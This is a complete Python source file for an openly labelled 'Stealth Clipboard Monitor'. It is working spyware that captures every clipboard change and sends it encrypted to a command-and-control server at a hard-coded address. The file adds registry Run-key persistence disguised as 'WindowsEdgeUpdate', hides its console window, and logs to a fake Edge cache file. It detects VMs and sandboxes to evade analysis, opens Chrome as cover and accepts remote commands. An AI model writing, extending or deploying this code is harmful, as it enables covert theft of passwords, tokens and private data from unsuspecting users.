#!/usr/bin/env python3
"""Stealth Clipboard Monitor - Captures clipboard data and sends to C2 server"""

import time
import socket
import threading
import os
import sys
import subprocess
import json
import argparse
import logging
import random
import ctypes
import webbrowser
from datetime import datetime
from pathlib import Path

# Runtime dependency installation
def ensure_dependencies():
    for pkg in ["pyperclip", "cryptography"]:
        try:
            __import__(pkg)
        except ImportError:
            print(f"[*] Installing {pkg}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])

ensure_dependencies()

import pyperclip
from cryptography.fernet import Fernet

# ====================== DEFAULT CONFIG ======================
DEFAULT_CONFIG = {
    "c2_ip": "192.168.18.133",
    "c2_port": 4445,
    "check_interval": 0.4,
    "reconnect_interval": 6,
    "heartbeat_interval": 55,
    "hide_window": True,
    "open_chrome": True,
    "chrome_url": "https://www.google.com",
    "persist": True,
    "debug": False,
    "aes_key": None
}

class ClipboardMonitor:
    def __init__(self, config):
        self.config = config
        self.last_text = ""
        self.running = True
        self.connected = False
        self.socket = None
        self.lock = threading.Lock()
        self.aes_cipher = None
        self.setup_logging()
        self.setup_aes()
        self.acquire_mutex()

    def setup_logging(self):
        log_dir = Path(os.getenv("LOCALAPPDATA", os.getenv("TEMP"))) / "Microsoft" / "Edge" / "User Data" / "Default" / "Cache" / "Cache_Data"
        log_dir.mkdir(parents=True, exist_ok=True)
        self.config["log_dir"] = str(log_dir)

        log_file = log_dir / "index.dat"   # Masqueraded filename

        level = logging.DEBUG if self.config.get("debug") else logging.INFO
        logging.basicConfig(
            level=level,
            format='%(asctime)s | %(levelname)s | %(message)s',
            handlers=[
                logging.FileHandler(log_file, encoding='utf-8'),
                logging.StreamHandler(sys.stdout) if self.config.get("debug") else logging.NullHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def setup_aes(self):
        key_file = Path(self.config["log_dir"]) / ".cache_key"
        if key_file.exists():
            key = key_file.read_bytes()
        else:
            key = Fernet.generate_key()
            key_file.write_bytes(key)
            self.logger.info("New AES key generated and saved")
        self.aes_cipher = Fernet(key)

    def acquire_mutex(self):
        """Single instance protection"""
        if sys.platform == "win32":
            try:
                self.mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\ClipboardMonitorMutex_2025")
                if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                    self.logger.warning("Another instance is already running. Exiting.")
                    sys.exit(0)
            except Exception as e:
                self.logger.debug(f"Mutex error: {e}")

    def is_vm(self):
        """Basic anti-VM / sandbox detection"""
        checks = [
            r"HARDWARE\ACPI\FADT\VBOX__",
            r"HARDWARE\DESCRIPTION\System\BIOS\SystemManufacturer",
            r"SOFTWARE\VMware, Inc.",
            r"SOFTWARE\Oracle\VirtualBox Guest Additions"
        ]
        try:
            for key in checks:
                result = subprocess.run(['reg', 'query', f'HKLM\\{key}'], 
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if result.returncode == 0:
                    self.logger.warning("VM/Sandbox detected! Exiting for OPSEC.")
                    return True
        except Exception as e:
            self.logger.debug(f"VM check error: {e}")
        return False

    def open_chrome(self):
        if not self.config["open_chrome"]:
            return
        try:
            paths = [
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                rf"C:\Users\{os.getenv('USERNAME')}\AppData\Local\Google\Chrome\Application\chrome.exe"
            ]
            for p in paths:
                if os.path.exists(p):
                    subprocess.Popen([p, self.config["chrome_url"], "--new-window", "--start-maximized"],
                                   creationflags=subprocess.CREATE_NO_WINDOW)
                    self.logger.info("Chrome opened as cover")
                    return
            webbrowser.open(self.config["chrome_url"])
        except Exception as e:
            self.logger.warning(f"Chrome launch failed: {e}")

    def encrypt(self, data: str) -> bytes:
        return self.aes_cipher.encrypt(data.encode('utf-8'))

    def decrypt(self, data: bytes) -> str:
        return self.aes_cipher.decrypt(data).decode('utf-8')

    def connect_to_c2(self):
        with self.lock:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)
                self.socket.connect((self.config["c2_ip"], self.config["c2_port"]))
                self.connected = True
                self.send_message(f"[+] Clipboard Monitor Started @ {datetime.now()}")
                self.logger.info(f"Connected to C2 {self.config['c2_ip']}:{self.config['c2_port']}")
                return True
            except Exception as e:
                self.connected = False
                self.logger.debug(f"C2 connect failed: {e}")
                return False

    def send_message(self, message: str):
        with self.lock:
            if not (self.connected and self.socket):
                return False
            try:
                encrypted = self.encrypt(message)
                self.socket.send(len(encrypted).to_bytes(4, 'big') + encrypted)
                return True
            except Exception as e:
                self.connected = False
                self.logger.debug(f"Send error: {e}")
                if self.socket:
                    try:
                        self.socket.close()
                    except Exception:
                        pass
                return False

    def receive_commands(self):
        """Bidirectional C2 handler"""
        while self.running and self.connected:
            try:
                length_bytes = self.socket.recv(4)
                if not length_bytes:
                    break
                length = int.from_bytes(length_bytes, 'big')
                data = self.socket.recv(length)
                if not data:
                    break

                cmd = self.decrypt(data).strip().lower()
                self.logger.info(f"Received command: {cmd}")

                if cmd == "ping":
                    self.send_message("pong")
                elif cmd.startswith("interval"):
                    try:
                        new_int = float(cmd.split()[1])
                        self.config["check_interval"] = new_int
                        self.logger.info(f"Check interval updated to {new_int}s")
                    except (IndexError, ValueError) as e:
                        self.logger.debug(f"Invalid interval command: {e}")
                        self.send_message("Invalid interval")
                elif cmd == "screenshot":
                    self.send_message("[!] Screenshot feature coming in next version")
                elif cmd == "uninstall":
                    self.running = False
                    self.send_message("Uninstalling...")
                    self.cleanup()
                elif cmd == "help":
                    self.send_message("Available: ping, interval X, screenshot, uninstall")
            except Exception as e:
                self.logger.debug(f"Command receive error: {e}")
                break

    def save_locally(self, data: str):
        try:
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            backup = Path(self.config["log_dir"]) / f"cache_{datetime.now():%Y%m%d}.log"
            with open(backup, 'a', encoding='utf-8') as f:
                f.write(f"[{ts}] {data}\n")
        except Exception as e:
            self.logger.debug(f"Save error: {e}")

    def heartbeat(self):
        """Periodic heartbeat even when idle"""
        while self.running:
            if self.connected:
                self.send_message(f"[HEARTBEAT] {datetime.now()}")
            time.sleep(self.config["heartbeat_interval"] + random.uniform(-10, 10))

    def monitor_clipboard(self):
        if self.is_vm():
            sys.exit(0)

        self.open_chrome()

        # Start helper threads
        threading.Thread(target=self.heartbeat, daemon=True).start()
        threading.Thread(target=self.auto_reconnect, daemon=True).start()

        self.logger.info("Clipboard monitor started")

        while self.running:
            try:
                current = pyperclip.paste().strip()
                if current and current != self.last_text:
                    self.save_locally(current)
                    self.send_message(f"[{datetime.now():%H:%M:%S}] {current}")
                    self.last_text = current
            except Exception as e:
                self.logger.debug(f"Clipboard read error: {e}")

            # Jitter
            sleep_time = self.config["check_interval"] * random.uniform(0.7, 1.3)
            time.sleep(sleep_time)

    def auto_reconnect(self):
        while self.running:
            if not self.connected:
                self.connect_to_c2()
                if self.connected:
                    threading.Thread(target=self.receive_commands, daemon=True).start()
            time.sleep(self.config["reconnect_interval"] + random.uniform(-2, 3))

    def cleanup(self):
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except Exception as e:
                self.logger.debug(f"Socket close error: {e}")
        self.logger.info("Monitor stopped")


# ====================== LAUNCHER ======================
def hide_console():
    if sys.platform == "win32":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception as e:
            pass


def load_or_create_config():
    config_path = Path("config.json")
    if config_path.exists():
        try:
            with open(config_path) as f:
                return {**DEFAULT_CONFIG, **json.load(f)}
        except Exception as e:
            pass
    try:
        with open(config_path, "w") as f:
            json.dump(DEFAULT_CONFIG, f, indent=2)
    except Exception as e:
        pass
    return DEFAULT_CONFIG.copy()


def add_persistence():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        subprocess.run(['reg', 'add', f'HKCU\\{key}', '/v', 'WindowsEdgeUpdate', '/t', 'REG_SZ',
                       '/d', f'"{exe_path}"', '/f'], check=True)
    except Exception as e:
        pass


def parse_args():
    parser = argparse.ArgumentParser(description="Stealth Clipboard Monitor")
    parser.add_argument("--c2-ip", default=None, help="C2 IP address")
    parser.add_argument("--c2-port", type=int, default=None, help="C2 port")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")
    parser.add_argument("--no-chrome", action="store_true", help="Disable Chrome cover")
    parser.add_argument("--no-persist", action="store_true", help="Disable persistence")
    return parser.parse_args()


def main():
    args = parse_args()
    config = load_or_create_config()

    if args.c2_ip:
        config["c2_ip"] = args.c2_ip
    if args.c2_port:
        config["c2_port"] = args.c2_port
    if args.debug:
        config["debug"] = True
    if args.no_chrome:
        config["open_chrome"] = False
    if args.no_persist:
        config["persist"] = False

    hide_console()

    # Spawn hidden + single instance logic
    if config["hide_window"] and len(sys.argv) < 2 and sys.platform == "win32":
        subprocess.Popen([sys.executable, sys.argv[0], "hidden"],
                         creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)

    if config["persist"]:
        add_persistence()

    monitor = ClipboardMonitor(config)
    try:
        monitor.monitor_clipboard()
    except KeyboardInterrupt:
        monitor.cleanup()
    except Exception as e:
        try:
            monitor.logger.error(f"Critical error: {e}")
        except:
            print(f"Critical error: {e}")


if __name__ == "__main__":
    main()
